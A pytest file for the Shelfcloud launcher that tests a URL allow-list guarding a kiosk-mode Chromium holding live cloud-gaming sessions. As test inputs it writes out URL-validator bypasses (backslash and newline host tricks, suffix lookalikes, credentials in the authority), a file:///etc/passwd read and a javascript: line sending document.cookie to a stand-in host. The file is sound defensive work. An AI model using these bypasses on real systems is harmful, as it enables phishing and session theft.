# Shelfcloud project - https://shelfcloud.schelstraete.org - bart@schelstraete.org
"""Where a Steam shortcut is allowed to send the browser.

A launch opens a kiosk-mode Chromium — no address bar, no tab strip — using a
profile that holds live Microsoft, NVIDIA and Boosteroid sessions. A page shown
in that window cannot be inspected by the person looking at it, so "which URL"
is a security question, not a routing detail.

The URL arrives from two places, and NEITHER is trusted:

  1. the gateway, asked at launch time — a server, and servers get compromised
  2. the Steam shortcut itself, written by an earlier sync and sat on disk since

So the check lives here, on the device. The gateway agreeing with it is not
what makes it safe; the device refusing is.

Run: python3 -m pytest tests/unit
"""

import os
import sys
import types
from unittest import mock

import pytest

# cdp is imported by the launcher for the autoplay click; it pulls in nothing
# needed here, and stubbing it keeps this a unit test.
sys.modules.setdefault("cdp", types.ModuleType("cdp"))

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(ROOT, "bin"))
sys.path.insert(0, os.path.join(ROOT, "py_modules"))

import importlib.util  # noqa: E402

spec = importlib.util.spec_from_file_location(
    "shelfcloud_launch", os.path.join(ROOT, "bin", "shelfcloud-launch.py"))
launcher = importlib.util.module_from_spec(spec)
spec.loader.exec_module(launcher)

allowed = launcher.is_allowed_launch_url


# ------------------------------------------------- the real provider URLs
#
# Shapes taken from the production catalog, which is https on exactly three
# hosts across all 5,965 rows.

@pytest.mark.parametrize("url", [
    "https://play.geforcenow.com/games?game-id=abc-123&lang=en_US",
    "https://cloud.boosteroid.com/application/682",
    "https://www.xbox.com/play/games/forza-horizon-5/9NKX70BBCDRN",
    "https://luna.amazon.com/game/alan-wake-2/B0GFWDM8NP?autoplay=1",
    "https://luna.amazon.com/game/fortnite?autoplay=1",   # the one ASIN-less title
    "https://cloud.boosteroid.com/",          # the setup URLs the launcher uses
    "https://play.geforcenow.com/",
    "https://www.xbox.com/play",
    "https://luna.amazon.com/",
])
def test_the_providers_are_allowed(url):
    assert allowed(url) is True


# ------------------------------------------------------------- Amazon Luna
#
# Luna is the one provider pinned to a FULL host rather than a registrable
# domain, because "amazon.com" as a suffix rule would admit everything Amazon
# serves. These tests are what keeps that decision from being casually undone.

@pytest.mark.parametrize("hostile", [
    "https://www.amazon.com/dp/B0GFWDM8NP",        # retail
    "https://amazon.com/",
    "https://sellercentral.amazon.com/",
    "https://s3.amazonaws.com/bucket/page.html",
    "https://luna.amazon.com.evil.com/game/x",     # suffix lookalike
    "https://notluna.amazon.com/game/x",
    "https://luna.amazon.de/game/x",               # real Luna, but not our host
])
def test_only_the_luna_host_is_allowed_not_amazon_at_large(hostile):
    """Widening this entry to "amazon.com" would pass every one of these.

    The launch opens in a kiosk browser with no address bar, carrying live
    provider sessions — so "somewhere on amazon.com" is not a safe answer.
    luna.amazon.de is refused for the same reason and costs nothing: the
    catalog stores luna.amazon.com links, which redirect each user to their own
    country's Luna domain anyway.
    """
    assert allowed(hostile) is False, hostile


def test_the_luna_launch_url_the_catalog_actually_builds_is_allowed():
    """Guards the contract between the two repos.

    The gateway's sources/amazon_luna.py builds exactly this shape. If either
    side changes host or scheme, every Luna tile stops launching — and the
    failure appears on the device, not in the gateway's tests.
    """
    built = "https://luna.amazon.com/game/{slug}/{asin}?autoplay=1".format(
        slug="alien-isolation", asin="B09HFKWMTQ")
    assert allowed(built) is True


def test_a_subdomain_of_a_provider_is_allowed():
    """Providers move things between subdomains; the registrable domain is the
    thing being trusted, not one hostname."""
    assert allowed("https://eu-west.play.geforcenow.com/games?game-id=1") is True


# ------------------------------------------------------- what must be refused

def test_plain_http_is_refused():
    """A launch carries provider session cookies. Over http they are readable
    by anything on the path, which can also rewrite the page."""
    assert allowed("http://play.geforcenow.com/games?game-id=1") is False


def test_an_unrelated_site_is_refused():
    assert allowed("https://evil.example/phish") is False


def test_a_suffix_lookalike_is_refused():
    """The bug this class of check is famous for.

    "xbox.com.evil.com" ends with "xbox.com". Without requiring the dot that
    starts the label, every allow-list of this shape is bypassed by registering
    one domain.
    """
    for hostile in ("https://xbox.com.evil.com/play",
                    "https://play.geforcenow.com.evil.com/games",
                    "https://notxbox.com/play",
                    "https://myboosteroid.com/application/1"):
        assert allowed(hostile) is False, hostile


@pytest.mark.parametrize("hostile", [
    "https://evil.com\\cloud.boosteroid.com/steal",
    "https://evil.com\\www.xbox.com/",
    "https://evil.com\\play.geforcenow.com/games",
    "https://evil.com\\\\www.xbox.com/",
    "https://evil.com/\\www.xbox.com/",
    "https://www.xbox.com\\@evil.com/",
])
def test_a_backslash_is_refused_because_the_browser_reads_it_as_a_slash(hostile):
    """The check and the browser must agree on what the host is.

    Python's urlsplit follows RFC 3986, where "\\" is an ordinary character, so
    the host of

        https://evil.com\\cloud.boosteroid.com/steal

    is "evil.com\\cloud.boosteroid.com" — which ends with ".boosteroid.com" and
    passed every other rule here. Chromium follows the WHATWG URL Standard,
    where "\\" ends the authority exactly like "/", so the SAME string opens
    evil.com: an attacker's page, in kiosk mode, with the user's provider
    sessions and no address bar to reveal it.

    A parser differential, and the browser is the parser that matters.
    """
    assert allowed(hostile) is False


@pytest.mark.parametrize("hostile", [
    "https://evil.com\t.boosteroid.com/",
    "https://evil.com\n.xbox.com/",
    "https://evil.com\r.xbox.com/",
    "https://www.xbox.com\n",
])
def test_tabs_and_newlines_are_refused(hostile):
    """Browsers strip these from a URL before resolving it, which can move the
    host boundary after this function has approved the string."""
    assert allowed(hostile) is False


def test_the_raw_string_is_checked_before_it_is_stripped():
    """A trailing newline is part of the attack, so .strip() must not remove it
    before the check has had a chance to see it."""
    assert allowed("https://evil.com\\www.xbox.com/\n") is False


def test_credentials_in_the_authority_are_refused():
    """"https://play.geforcenow.com@evil.com/" is a URL whose HOST is evil.com.

    It reads as the provider to a person and resolves elsewhere to a browser,
    which is exactly the property a phishing link wants.
    """
    for hostile in ("https://play.geforcenow.com@evil.com/",
                    "https://www.xbox.com:pass@evil.com/play"):
        assert allowed(hostile) is False, hostile


def test_non_web_schemes_are_refused():
    """A Chromium command line accepts more than web pages: file:// reads local
    files, and the rest are things a game launcher has no business opening."""
    for hostile in ("file:///etc/passwd",
                    "file:///home/deck/homebrew/settings/Shelfcloud/settings.json",
                    "javascript:fetch('//evil/?c='+document.cookie)",
                    "data:text/html,<script>alert(1)</script>",
                    "chrome://settings",
                    "ftp://play.geforcenow.com/x"):
        assert allowed(hostile) is False, hostile


def test_junk_is_refused_rather_than_raising():
    """This runs at launch. An exception here is a game that will not start
    with a Python traceback Steam throws away."""
    for junk in (None, "", "   ", 42, [], {}, b"https://www.xbox.com/play",
                 "not a url", "https://", "https:///play", "://xbox.com"):
        assert allowed(junk) is False, repr(junk)


def test_a_trailing_dot_host_does_not_slip_past():
    """"www.xbox.com." is the same host to a resolver. It is allowed — but the
    point is that it is NORMALISED rather than compared raw, because the same
    trick applied to a lookalike must still fail."""
    assert allowed("https://www.xbox.com./play") is True
    assert allowed("https://www.xbox.com.evil.com./play") is False


def test_case_is_not_a_bypass():
    assert allowed("https://WWW.XBOX.COM/play") is True
    assert allowed("HTTPS://www.xbox.com/play") is True


# --------------------------------------------- the gateway is not trusted

def settings(tmp_path, **extra):
    """A settings.json on disk, as the launcher reads it."""
    import json
    path = tmp_path / "settings.json"
    payload = {"api_token": "t" * 43}
    payload.update(extra)
    path.write_text(json.dumps(payload))
    return str(path)


def test_a_hostile_url_from_the_gateway_falls_back_instead_of_opening(tmp_path):
    """A compromised gateway is the threat this exists for. Its answer is
    refused and the known-good stored link is used."""
    good = "https://cloud.boosteroid.com/application/682"
    with mock.patch.object(launcher, "SETTINGS_FILE", settings(tmp_path)), \
         mock.patch.object(launcher, "urllib") as net:
        net.request.Request = mock.MagicMock()
        response = mock.MagicMock()
        response.__enter__ = lambda s: s
        response.__exit__ = lambda *a: False
        response.read.return_value = b'{"launch_url": "https://evil.example/phish"}'
        net.request.urlopen.return_value = response
        # urlsplit is needed by the validator, so keep the real parser.
        net.parse = __import__("urllib.parse", fromlist=["parse"])

        url, source = launcher.resolve_launch("42", good)

    assert url == good
    assert "refused" in source


def test_the_gateway_address_is_the_constant_not_a_setting(tmp_path):
    """settings.json still carries a gateway_url from older builds — on this
    developer's Deck a plaintext http://192.168.x.x:8000. Reading it sent the
    bearer token across the LAN in clear and took the launch URL from whoever
    answered that port."""
    seen = {}

    def capture(url, *a, **kw):
        seen["url"] = url
        raise OSError("stop here; the address is the assertion")

    with mock.patch.object(launcher, "SETTINGS_FILE",
                           settings(tmp_path, gateway_url="http://192.168.129.164:8000")), \
         mock.patch.object(launcher.urllib.request, "Request", side_effect=capture):
        launcher.resolve_launch("42", "https://www.xbox.com/play")

    assert seen["url"].startswith("https://")
    assert "192.168" not in seen["url"]
    assert seen["url"].startswith(launcher.GATEWAY)


def test_the_launcher_and_the_plugin_agree_on_the_gateway():
    """Two files, one address. They have disagreed before, and the disagreement
    is what kept the plaintext path alive after the plugin had moved on."""
    import re
    with open(os.path.join(ROOT, "main.py"), encoding="utf-8") as handle:
        match = re.search(r'^DEFAULT_GATEWAY\s*=\s*"([^"]+)"', handle.read(), re.M)
    assert match, "main.py no longer defines DEFAULT_GATEWAY"
    assert launcher.GATEWAY == match.group(1)


def test_the_gateway_is_reached_over_verified_tls():
    """The context must verify and check hostnames — that is what makes a
    machine-in-the-middle fail rather than succeed silently."""
    import ssl
    ctx = launcher._ssl_context()
    assert ctx.verify_mode == ssl.CERT_REQUIRED
    assert ctx.check_hostname is True
